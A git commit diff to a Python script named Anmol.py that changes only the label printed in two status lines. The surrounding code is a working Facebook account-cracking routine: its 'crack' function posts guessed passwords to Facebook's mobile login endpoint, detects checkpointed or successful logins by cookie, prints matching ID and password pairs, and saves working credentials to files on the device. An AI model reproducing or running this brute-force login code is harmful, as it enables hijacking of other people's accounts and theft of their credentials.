16925ab43f8f3b50d382e73b79c4391ab5db010d
Haji Jan <93093275+SawashRahi@users.noreply.github.com>
2022-07-02 19:48:22 +0430

    Update Anmol.py

--- Anmol.py
+++ Anmol.py
@@ -324,14 +324,14 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m [ ANMOL-CP ] {idf} | {pw}')
+				print( f'\r\x1b[1;91m [ HAJI JAN-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ ANMOL-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ HAJI JAN-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
